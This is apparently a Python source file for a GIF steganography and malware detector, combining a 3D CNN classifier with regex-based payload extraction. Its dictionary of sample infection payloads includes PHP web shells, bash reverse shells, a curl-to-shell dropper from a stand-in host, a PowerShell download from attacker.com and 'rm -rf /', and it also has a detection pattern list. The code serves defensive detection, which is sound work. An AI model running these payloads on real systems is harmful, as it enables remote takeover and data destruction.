# import torch
# from torch import nn
# from PIL import Image, ImageSequence
# import torchvision.transforms as transforms
# import os

# # === Config ===
# IMAGE_SIZE = (50, 50)
# FRAMES = 25
# DEVICE = "cuda" if torch.cuda.is_available() else "cpu"

# # === CNN Model ===
# class MultiHeadCNN(nn.Module):
#     def __init__(self, num_methods):
#         super().__init__()
#         self.conv = nn.Sequential(
#             nn.Conv3d(3, 16, kernel_size=3, padding=1),
#             nn.ReLU(),
#             nn.MaxPool3d((1, 2, 2)),
#             nn.Conv3d(16, 32, kernel_size=3, padding=1),
#             nn.ReLU(),
#             nn.MaxPool3d((1, 2, 2)),
#         )
#         self.flatten = nn.Flatten()
#         self.shared_fc = nn.Linear(32 * FRAMES * 12 * 12, 128)
#         self.head_class = nn.Linear(128, 2)
#         self.head_method = nn.Linear(128, num_methods)

#     def forward(self, x):
#         x = self.flatten(self.conv(x))
#         shared = self.shared_fc(x)
#         return self.head_class(shared), self.head_method(shared)

# # === Dummy Stubs for ResNet3D and Transformer ===
# # Replace these with actual models later
# class ResNet3D(nn.Module):
#     def __init__(self, num_methods):
#         super().__init__()
#         self.fc = nn.Linear(1, 1)  # Placeholder
#     def forward(self, x):
#         return torch.randn((x.size(0), 2)), torch.randn((x.size(0), num_methods)) # type: ignore

# class TransformerModel(nn.Module):
#     def __init__(self, num_methods):
#         super().__init__()
#         self.fc = nn.Linear(1, 1)  # Placeholder
#     def forward(self, x):
#         return torch.randn((x.size(0), 2)), torch.randn((x.size(0), num_methods)) # type: ignore

# # === Load GIF as tensor ===
# transform = transforms.Compose([
#     transforms.Resize(IMAGE_SIZE),
#     transforms.ToTensor()
# ])

# def load_gif_tensor(gif_path):
#     frames = []
#     gif = Image.open(gif_path)
#     for i, frame in enumerate(ImageSequence.Iterator(gif)):
#         if i >= FRAMES:
#             break
#         frames.append(transform(frame.convert("RGB")))
#     while len(frames) < FRAMES:
#         frames.append(frames[-1])
#     video = torch.stack(frames).permute(1, 0, 2, 3)  # [C, T, H, W]
#     return video.unsqueeze(0).to(DEVICE)

# # === Predict Function ===
# def predict_gif(gif_path, model_name="cnn"):
#     model_name = model_name.lower()
#     model_map = {
#         "cnn": ("cnn_model.pth", MultiHeadCNN),
#         "resnet3d": ("resnet3d_model.pth", ResNet3D),
#         "transformer": ("transformer_model.pth", TransformerModel)
#     }

#     if model_name not in model_map:
#         return "error", f"Unknown model: {model_name}"

#     model_path, model_class = model_map[model_name]

#     if not os.path.exists(model_path):
#         return "error", f"Model file '{model_path}' not found."

#     try:
#         checkpoint = torch.load(model_path, map_location=DEVICE)
#         method_to_idx = checkpoint["method_to_idx"]
#         idx_to_method = {v: k for k, v in method_to_idx.items()}
#         model = model_class(num_methods=len(method_to_idx)).to(DEVICE)
#         model.load_state_dict(checkpoint["model_state_dict"])
#         model.eval()

#         tensor = load_gif_tensor(gif_path)
#         with torch.no_grad():
#             out_class, out_method = model(tensor)
#             class_idx = out_class.argmax(1).item()
#             method_idx = out_method.argmax(1).item()
#             label = "infected" if class_idx == 1 else "clean"
#             method = idx_to_method.get(method_idx, "unknown")
#             return label, method
#     except Exception as e:
#         return "error", str(e)



############################################################################
import torch
from torch import nn
from PIL import Image, ImageSequence
import torchvision.transforms as transforms
import os
import base64
import re
# === Config ===
MODEL_PATH = "cnn__model.pth"
IMAGE_SIZE = (100, 100)
FRAMES = 25
DEVICE = "cuda" if torch.cuda.is_available() else "cpu"

infection_methods = {
    # PHP-Based Payloads
    "append_php_shell": "<?php @eval($_POST['cmd']); ?>",
    "append_php_base64": "<?php eval(base64_decode('ZWNobyAnaGVsbG8gd29ybGQnOw==')); ?>",
    "append_php_reverse_shell": "<?php system('/bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"'); ?>",

    # JavaScript-Based Payloads
    "append_js_eval": "<script>eval(atob('YWxlcnQoIkZha2UgSW5mZWN0aW9uIik='));</script>",
    "append_js_fetch": "<script>fetch('https://httpbin.org/get').then(r => r.json()).then(console.log);</script>",
    "append_js_redirect": "<script>window.location='https://malicious.com'</script>",

    # HTML/Polyglot
    "polyglot_html_gif": "<html><body><h1>Not a gif!</h1><script>alert('PWNED')</script></body></html>",

    # Metadata/Stego
    "metadata_comment_php": "<?php system('ls'); ?>",
    "metadata_comment_backdoor": "<?php passthru($_GET['cmd']); ?>",

    # EXE-like Signature Payload (as bytes)
    "append_fake_exe_header": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff",

    # Linux Shell Payloads
    "append_shell_reverse": "#!/bin/bash\nbash -i >& /dev/tcp/192.168.0.1/4444 0>&1",
    "append_shell_curl_dropper": "curl http://malicious.site/payload.sh | sh",

    # PowerShell-Based Payloads
    "append_powershell_base64": "powershell -EncodedCommand SQBFAFgAIAAiAEgAZQBsAGwAbwAiAA==",
    "append_powershell_webdl": "powershell -Command \"Invoke-WebRequest -Uri http://attacker.com/mal.exe -OutFile C:\\temp\\mal.exe\"",

    # Generic Suspicious Patterns
    "append_generic_base64": "U2FtcGxlIEJhc2U2NCBFbmNvZGVkIERhdGE=",
    "append_malicious_command": "rm -rf / --no-preserve-root"
}


# === CNN Model Definition ===
class MultiHeadCNN(nn.Module):
    def __init__(self, num_methods):
        super().__init__()
        self.conv = nn.Sequential(
            nn.Conv3d(3, 32, kernel_size=3, padding=1),
            nn.BatchNorm3d(32),
            nn.ReLU(),
            nn.MaxPool3d((1, 2, 2)),
            nn.Conv3d(32, 64, kernel_size=3, padding=1),
            nn.BatchNorm3d(64),
            nn.ReLU(),
            nn.MaxPool3d((1, 2, 2)),
        )
        self.flatten = nn.Flatten()
        self.shared_fc = nn.Linear(64 * FRAMES * 25 * 25, 256)
        self.head_class = nn.Linear(256, 2)
        self.head_method = nn.Linear(256, num_methods)

    def forward(self, x):
        x = self.flatten(self.conv(x))
        shared = self.shared_fc(x)
        return self.head_class(shared), self.head_method(shared)

# === GIF Loader ===
transform = transforms.Compose([
    transforms.Resize(IMAGE_SIZE),
    transforms.ToTensor()
])

def load_gif_tensor(gif_path):
    frames = []
    gif = Image.open(gif_path)
    for i, frame in enumerate(ImageSequence.Iterator(gif)):
        if i >= FRAMES:
            break
        frames.append(transform(frame.convert("RGB")))
    while len(frames) < FRAMES:
        frames.append(frames[-1])
    video = torch.stack(frames).permute(1, 0, 2, 3)  # [C, T, H, W]
    return video.unsqueeze(0).to(DEVICE)

# # === Extract payload manually (not predicted)
# def extract_payload(content: bytes):
#     content_str = content.decode(errors='ignore')
#     for method, pattern in infection_methods.items():
#         if isinstance(pattern, bytes):
#             if pattern in content:
#                 return method, pattern.decode(errors='ignore')
#         else:
#             if pattern in content_str:
#                 if "base64:" in pattern:
#                     try:
#                         b64_data = pattern.split("base64:")[1].strip()
#                         decoded = base64.b64decode(b64_data).decode()
#                         return method, f"{pattern}\nDecoded base64: {decoded}"
#                     except Exception:
#                         return method, f"{pattern}\n[Failed to decode base64]"
#                 return method, pattern
#     return "none", "No malicious pattern found"


def extract_payload(content: bytes):
    findings = []
    content_str = content.decode(errors='ignore')

    # === 1. Detect base64 strings ===
    base64_matches = re.findall(r'(?:[A-Za-z0-9+/]{20,}={0,2})', content_str)
    for match in base64_matches:
        try:
            decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
            if any(s in decoded.lower() for s in ['cmd', 'powershell', 'http', 'bash', 'wget', 'curl', 'exec']):
                findings.append({
                    'type': 'base64_payload',
                    'encoded': match,
                    'decoded': decoded
                })
        except Exception:
            continue

    # === 2. Suspicious function calls ===
    suspicious_patterns = [
        r'\beval\s*\(', r'\bexec\s*\(', r'os\.system', r'subprocess',
        r'cmd\.exe', r'powershell', r'bash -i', r'curl http', r'wget http',
        r'<script>.*?</script>', r'<\?php.*?\?>', r'rm -rf /', r'base64_decode\('
    ]

    for pat in suspicious_patterns:
        matches = re.findall(pat, content_str, re.IGNORECASE | re.DOTALL)
        for m in matches:
            findings.append({
                'type': 'suspicious_pattern',
                'match': m.strip()
            })

    # === 3. URLs and IPs ===
    urls = re.findall(r'https?://[^\s\'"]+', content_str)
    for url in urls:
        findings.append({'type': 'url_found', 'match': url})

    ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', content_str)
    for ip in ips:
        findings.append({'type': 'ip_address', 'match': ip})

    # === Return summarized result ===
    if findings:
        readable = ""
        for item in findings:
            if item['type'] == 'base64_payload':
                readable += f"\n[Base64] {item['encoded']}\nDecoded → {item['decoded']}\n"
            else:
                readable += f"\n[{item['type']}] {item['match']}"
        return "suspicious", readable.strip()
    else:
        return "clean", "No known or suspicious pattern found"

# === Inference Entry Point ===
def predict_gif(gif_path):
    if not os.path.exists(MODEL_PATH):
        return {
            "prediction": "error",
            "model_method": "unknown",
            "payload_detected": "none",
            "extracted_payload": "Model not found."
        }

    tensor = load_gif_tensor(gif_path)
    checkpoint = torch.load(MODEL_PATH, map_location=DEVICE)
    method_to_idx = checkpoint["method_to_idx"]
    idx_to_method = {v: k for k, v in method_to_idx.items()}

    model = MultiHeadCNN(num_methods=len(method_to_idx)).to(DEVICE)
    model.load_state_dict(checkpoint["model_state_dict"])
    model.eval()

    with torch.no_grad():
        out_class, out_method = model(tensor)
        class_idx = out_class.argmax(1).item()
        method_idx = out_method.argmax(1).item()

        label = "infected" if class_idx == 1 else "clean"
        model_method = idx_to_method.get(method_idx, "unknown")

    with open(gif_path, "rb") as f:
        content = f.read()
        detected_method, extracted_payload = extract_payload(content)

    return {
        "prediction": label,
        "model_method": model_method,
        "payload_detected": detected_method,
        "extracted_payload": extracted_payload
    }
